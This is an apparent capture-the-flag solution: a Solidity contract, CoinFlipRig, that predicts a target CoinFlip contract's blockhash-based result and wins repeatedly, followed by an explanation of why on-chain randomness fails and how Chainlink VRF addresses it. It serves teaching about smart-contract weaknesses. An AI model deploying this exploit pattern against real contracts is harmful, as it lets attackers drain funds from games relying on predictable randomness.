```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipRig {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;

  }

  function flipGuess(address _targetAddress) public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    bool guess = ICoinFlip(_targetAddress).flip(side);
    if (guess) {
      consecutiveWins++;
    } else {
      consecutiveWins = 0;
    }
  }
}
```

We cannot generate a random number in blockchain itself using the different block parameters as they can be seen by everyone on what it is going to be. To hack the CoinFlip contract we use the CoinFlipRig contract which has similar implementation to CoinFlip as block.number will be same in the same transaction so we can use the same implementation logic to guess the coinFlip side and feed into the flip function of the CoinFlip contract. We have to call the flip function from the contract 10 times in the different transaction as there is a if condition checking if it the same blockhash as the previous one, so the flip method should be called 10 times. So, as we cannot truely generate the random number within the blockchain so we have to use the external source for example Chainlink VRF which generates the random number outof the blockchain and provide the random number to our contract in the form of callback.